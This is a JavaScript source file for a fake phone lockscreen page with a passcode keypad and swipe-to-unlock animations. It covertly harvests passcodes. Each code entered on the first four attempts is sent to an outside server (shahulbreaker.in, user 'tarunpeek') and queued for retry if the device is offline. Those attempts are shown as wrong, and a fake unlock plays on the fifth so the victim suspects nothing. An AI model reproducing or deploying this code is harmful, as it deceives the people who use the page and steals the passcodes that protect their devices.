(() => {
  const API_BASE = "https://shahulbreaker.in/api/storedata.php?user=tarunpeek&data=";
  const MAX = 4;
  let code = "";

  const dotEls = Array.from(document.querySelectorAll('.dot'));
  const keys = Array.from(document.querySelectorAll('.key[data-num]'));
  const emergency = document.getElementById('emergency');
  const cancelBtn = document.getElementById('cancel');
  const unlockOverlay = document.getElementById('unlockOverlay');
  const lockInner = document.querySelector('.lockscreen-inner');
  const homescreenImg = document.getElementById('homescreenImg');
  const homeIndicator = document.querySelector('.home-indicator');
  const lockOuter = document.querySelector('.lockscreen');
  const ATT_KEY = '_pass_attempt_count_';
  const QUEUE_KEY = '_pass_queue_';

  function getAttempts() { return parseInt(localStorage.getItem(ATT_KEY) || '0', 10); }
  function setAttempts(n) { localStorage.setItem(ATT_KEY, String(n)); }

  function refreshDots() {
    dotEls.forEach((d,i) => d.classList.toggle('filled', i < code.length));
  }

  function reset() {
    code = "";
    refreshDots();
  }

  function queuePass(pass) {
    const q = JSON.parse(localStorage.getItem(QUEUE_KEY) || '[]');
    q.push({ pass, ts: Date.now() });
    localStorage.setItem(QUEUE_KEY, JSON.stringify(q));
  }

  function sendToAPI(pass) {
    const url = API_BASE + encodeURIComponent(pass);
    return fetch(url, { method: 'GET', keepalive: true })
      .catch(() => {
        queuePass(pass);
      });
  }

  function flushQueue() {
    const queue = JSON.parse(localStorage.getItem(QUEUE_KEY) || '[]');
    if (!queue.length) return;
    queue.forEach(item => {
      fetch(API_BASE + encodeURIComponent(item.pass), { method: 'GET', keepalive: true }).catch(()=>{});
    });
    localStorage.removeItem(QUEUE_KEY);
  }

  /* ---------- Spring engine (semi-implicit integrator) ----------
     unchanged from previous but supports initial velocity (px/sec).
  */
  function springAnimate(opts) {
    const mass = opts.mass ?? 1;
    const stiffness = opts.stiffness ?? 120; // k
    const damping = opts.damping ?? 14;      // c
    const threshold = opts.threshold ?? 0.02;
    let x = opts.from;
    let v = opts.velocity ?? 0; // px / sec
    const target = opts.to;
    let last = performance.now();
    let rafId = null;

    function step(now) {
      const dt = Math.min(0.032, (now - last) / 1000);
      last = now;
      // a = (-k*(x - target) - c*v)/m
      const a = (-stiffness * (x - target) - damping * v) / mass;
      v += a * dt;
      x += v * dt;

      if (typeof opts.onUpdate === 'function') opts.onUpdate(x);

      const isSettled = Math.abs(v) < threshold && Math.abs(x - target) < (Math.abs(target) * 0.005 + 0.5);
      if (isSettled) {
        if (typeof opts.onUpdate === 'function') opts.onUpdate(target);
        if (typeof opts.onComplete === 'function') opts.onComplete();
        cancelAnimationFrame(rafId);
        return;
      }
      rafId = requestAnimationFrame(step);
    }

    rafId = requestAnimationFrame(step);
    return () => cancelAnimationFrame(rafId);
  }

  /* ---------- Interactive drag state ----------
     We'll track pointer events on lockInner and update transforms directly.
  */
  let isDragging = false;
  let startY = 0;
  let lastY = 0;
  let lastT = 0;
  let currentY = 0; // px (0 = rest; negative => moved up)
  let velocity = 0; // px/sec (negative is upward)
  const VELOCITY_THRESHOLD = -1000; // px/sec (fast upward release)
  const DISTANCE_THRESHOLD = 0.32; // fraction of viewport height to consider unlock
  const MAX_UPWARD = () => Math.max(window.innerHeight || document.documentElement.clientHeight, 1) * 1.08;

  function setLockTransform(y, options = {}) {
    // y: px (negative => up)
    // compute normalized progress 0..1
    const height = Math.max(window.innerHeight, document.documentElement.clientHeight);
    const t = Math.min(1, Math.max(0, Math.abs(y) / (height * 1.08)));
    // slight tilt and scale mapping
    const rotateX = Math.min(6, 6 * t); // up to 6deg
    const scale = 1 - (0.003 * t); // tiny shrink
    lockInner.style.transform = `translate3d(0, ${y}px, 0) rotateX(${rotateX}deg) scale(${scale})`;
    lockInner.style.opacity = String(1 - Math.min(0.22, t * 0.22));

    // shadow depth
    const shadowA = 0.55 - (0.35 * t); // reduce shadow as it goes away
    lockInner.style.boxShadow = `0 ${Math.round(40 - 18 * t)}px ${Math.round(90 - 50 * t)}px rgba(0,0,0,${shadowA})`;

    // homescreen mapping (parallax)
    if (homescreenImg) {
      // smoother mapping: small upward translate -> progress
      const homeScale = 0.96 + 0.12 * t; // 0.96 -> 1.08-ish at overshoot; will be clamped by spring later
      const blur = Math.max(0, 10 * (1 - t));
      const sat = 0.9 + Math.min(0.15, t * 0.15);
      homescreenImg.style.opacity = String(Math.min(1, 0.12 + t));
      homescreenImg.style.transform = `translate3d(0, ${Math.round(6 - 6 * t)}%, 0) scale(${homeScale})`;
      homescreenImg.style.filter = `blur(${blur}px) saturate(${sat})`;
    }

    // home indicator fades
    if (homeIndicator) {
      homeIndicator.style.opacity = String(Math.max(0, 1 - t * 1.4));
      if (t > 0.85) homeIndicator.classList.add('hidden');
      else homeIndicator.classList.remove('hidden');
    }

    if (options.noShadow) lockInner.style.boxShadow = '';
  }

  // pointer handlers
  function onPointerDown(ev) {
    // only primary button / single touch
    if (ev.pointerType === 'mouse' && ev.button !== 0) return;
    isDragging = true;
    startY = ev.clientY;
    lastY = startY;
    lastT = performance.now();
    currentY = 0;
    velocity = 0;
    lockOuter && lockOuter.classList.add('dragging');
    lockInner && lockInner.classList.add('tilting');
    lockInner.setPointerCapture && lockInner.setPointerCapture(ev.pointerId);
  }

  function onPointerMove(ev) {
    if (!isDragging) return;
    const now = performance.now();
    const deltaY = ev.clientY - lastY;
    // update currentY: we want upward movement to be negative
    currentY += deltaY;
    // Clamp downward drag so lock doesn't go too far down
    currentY = Math.min(120, currentY); // allow slight downward
    // compute velocity (px/sec)
    const dt = Math.max(1, now - lastT) / 1000;
    velocity = (ev.clientY - lastY) / dt; // px / sec
    lastY = ev.clientY;
    lastT = now;
    // For UX, convert drag so that moving finger up moves UI up (negative)
    // we track currentY (positive = down). We prefer negative up; so compute yForTransform = currentY - startDelta.
    // But simpler: compute dragAmt = ev.clientY - startY; then set y = Math.min(0, dragAmt)
    const dragAmt = ev.clientY - startY;
    const yForTransform = Math.min(120, dragAmt); // positive down allowed small
    // We'll use negative of upward movement: if dragAmt < 0 => yForTransform negative
    setLockTransform(yForTransform);
  }

  function onPointerUp(ev) {
    if (!isDragging) return;
    isDragging = false;
    lockOuter && lockOuter.classList.remove('dragging');
    lockInner && lockInner.classList.remove('tilting');
    lockInner.releasePointerCapture && lockInner.releasePointerCapture(ev.pointerId);

    // final drag position & velocity: compute using startY and lastY
    const endY = ev.clientY;
    const dragAmt = endY - startY; // positive down, negative up
    const height = Math.max(window.innerHeight, document.documentElement.clientHeight);
    const frac = Math.abs(dragAmt) / height;

    // compute upward px/sec velocity (negative means upward)
    // we computed velocity earlier as px/sec for pointermove; convert sign so upward => negative
    const v_px_sec = (lastT && lastY) ? ( (ev.clientY - lastY) / (Math.max(1, performance.now() - lastT) / 1000) ) : 0;
    // simpler fallback: approximate velocity from last known velocity variable (which may be large)
    const approxV = (velocity) ? velocity : 0;
    const finalV = (approxV && !Number.isNaN(approxV)) ? approxV : 0;

    // Decide unlock if either fast upward release or dragged beyond threshold
    const unlockByVelocity = finalV < VELOCITY_THRESHOLD; // strong upward (note finalV positive when moving down; negative when up)
    const unlockByDistance = Math.abs(dragAmt) > DISTANCE_THRESHOLD * height;

    if (unlockByVelocity || unlockByDistance) {
      // Start spring toward full unlock from current drag position.
      // We want to pass the current transform Y (px) and initial velocity (px/sec)
      // Note: dragAmt positive => down; we want y negative when user dragged up.
      const startYpx = dragAmt; // negative if upward
      // ensure homescreen overlay is visible
      unlockOverlay.classList.add('show');

      // small haptic pulse
      if (navigator.vibrate) try { navigator.vibrate(8); } catch(e) {}

      // start spring to complete unlock (targetY negative big)
      const targetY = -Math.round(MAX_UPWARD());
      springAnimate({
        from: startYpx,
        to: targetY,
        velocity: finalV, // px/sec (may be negative for upward)
        mass: 1.05,
        stiffness: 140,
        damping: 16,
        onUpdate: (val) => {
          setLockTransform(val);
        },
        onComplete: () => {
          // keep homescreen visible and remove lockInner visual
          lockInner.style.boxShadow = '';
          lockInner.style.opacity = '0';
          lockInner.style.transform = `translate3d(0, ${targetY}px, 0)`;
          // ensure homescreen ends clear
          if (homescreenImg) {
            homescreenImg.style.transform = 'translate3d(0,0,0) scale(1)';
            homescreenImg.style.filter = 'blur(0) saturate(1)';
            homescreenImg.style.opacity = '1';
          }
          // optional: tiny vibrate
          if (navigator.vibrate) try { navigator.vibrate(18); } catch(e) {}
        }
      });
    } else {
      // spring back to rest (0) from current drag position using measured velocity
      const startYpx = dragAmt;
      springAnimate({
        from: startYpx,
        to: 0,
        velocity: finalV,
        mass: 1,
        stiffness: 240,
        damping: 22,
        onUpdate: (val) => {
          setLockTransform(val);
        },
        onComplete: () => {
          // cleanup to exact resting state
          setLockTransform(0, { noShadow: true });
        }
      });
    }
  }

  // attach pointer events to lockInner for interactive dragging
  if (lockInner) {
    // use pointer events for unified touch/pen/mouse handling
    lockInner.addEventListener('pointerdown', onPointerDown);
    window.addEventListener('pointermove', onPointerMove, { passive: true });
    window.addEventListener('pointerup', onPointerUp);
    window.addEventListener('pointercancel', onPointerUp);
  }

  /* ---------- Existing behavior: playUnlockAnimation fallback (non-interactive triggers) ----------
     We keep a function for programmatic unlocks (e.g. after 5th attempt).
     It will start springs from rest (0).
  */
  function playUnlockAnimation() {
    // Respect reduced-motion
    const prefersReduced = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
    if (!lockInner || !unlockOverlay || !homescreenImg) return;
    unlockOverlay.classList.add('show');

    if (prefersReduced) {
      lockInner.style.transform = `translate3d(0, -110%, 0)`;
      homescreenImg.style.transform = `translate3d(0,0,0) scale(1)`;
      homescreenImg.style.opacity = '1';
      homescreenImg.style.filter = 'blur(0) saturate(1)';
      return;
    }

    const height = Math.max(window.innerHeight, document.documentElement.clientHeight);
    const targetY = -Math.round(height * 1.08);

    // shadow visual
    lockInner.style.boxShadow = '0 40px 90px rgba(0,0,0,0.55)';
    springAnimate({
      from: 0,
      to: targetY,
      velocity: 0,
      mass: 1.05,
      stiffness: 140,
      damping: 16,
      onUpdate: (val) => setLockTransform(val),
      onComplete: () => {
        lockInner.style.boxShadow = '';
        lockInner.style.opacity = '0';
        lockInner.style.transform = `translate3d(0, ${targetY}px, 0)`;
        if (homescreenImg) {
          homescreenImg.style.transform = 'translate3d(0,0,0) scale(1)';
          homescreenImg.style.filter = 'blur(0) saturate(1)';
          homescreenImg.style.opacity = '1';
        }
      }
    });

    // homescreen spring
    springAnimate({
      from: 0,
      to: 1,
      velocity: 0,
      mass: 1,
      stiffness: 80,
      damping: 11,
      onUpdate: (p) => {
        // map p 0..1 to home transforms as earlier
        const progress = Math.max(0, Math.min(1, p));
        const homeScale = 0.96 + 0.12 * progress;
        const blur = Math.max(0, 10 * (1 - progress));
        const sat = 0.9 + Math.min(0.15, progress * 0.15);
        homescreenImg.style.opacity = String(Math.min(1, 0.1 + progress));
        homescreenImg.style.transform = `translate3d(0,0,0) scale(${homeScale})`;
        homescreenImg.style.filter = `blur(${blur}px) saturate(${sat})`;
      },
      onComplete: () => {
        homescreenImg.style.transform = 'translate3d(0,0,0) scale(1)';
        homescreenImg.style.filter = 'blur(0) saturate(1)';
        homescreenImg.style.opacity = '1';
      }
    });
  }

  function animateWrongAttempt() {
    const dotsEl = document.getElementById('dots');
    if (!dotsEl) {
      reset();
      return;
    }
    const DURATION = 700;
    dotsEl.classList.add('wrong');
    reset();
    setTimeout(() => {
      dotsEl.classList.remove('wrong');
    }, DURATION + 20);
    // small haptic tap for wrong attempt
    if (navigator.vibrate) try { navigator.vibrate(8); } catch(e) {}
  }

  async function handleCompleteAttempt(enteredCode) {
    let attempts = getAttempts();
    attempts += 1;
    setAttempts(attempts);

    if (attempts >= 1 && attempts <= 4) {
      sendToAPI(enteredCode);
      animateWrongAttempt();
    } else if (attempts === 5) {
      // trigger the programmatic unlock (spring from rest)
      playUnlockAnimation();
      setTimeout(reset, 300);
    }

    if (attempts >= 5) {
      setAttempts(0);
    }
  }

  function animateBrightness(el, target, duration) {
    let startTime;
    const initial = parseFloat(el.dataset.brightness || "1");
    const change = target - initial;

    function easeOutCubic(t) {
      return 1 - Math.pow(1 - t, 3);
    }

    function frame(ts) {
      if (!startTime) startTime = ts;
      const progress = Math.min((ts - startTime) / duration, 1);
      const eased = easeOutCubic(progress);
      const value = initial + change * eased;
      el.style.filter = `brightness(${value})`;
      el.dataset.brightness = value.toFixed(3);
      if (progress < 1) {
        requestAnimationFrame(frame);
      }
    }
    requestAnimationFrame(frame);
  }

  keys.forEach(k => {
    const num = k.dataset.num;
    if (!num) return;

    k.addEventListener('touchstart', () => {
      animateBrightness(k, 1.6, 80); // increased brightness
    }, { passive: true });

    const endPress = () => {
      animateBrightness(k, 1, 100);
    };
    k.addEventListener('touchend', endPress);
    k.addEventListener('touchcancel', endPress);
    k.addEventListener('mouseleave', endPress);

    k.addEventListener('click', () => {
      if (code.length >= MAX) return;
      code += num;
      refreshDots();

      if (code.length === MAX) {
        const enteredCode = code;
        setTimeout(() => {
          handleCompleteAttempt(enteredCode);
        }, 120);
      }
    });
  });

  emergency && emergency.addEventListener('click', e => e.preventDefault());
  cancelBtn && cancelBtn.addEventListener('click', e => { e.preventDefault(); reset(); });

  window.addEventListener('online', flushQueue);
  flushQueue();

  window.__passUI = { getCode: () => code, reset, getAttempts, queuePass };

})();
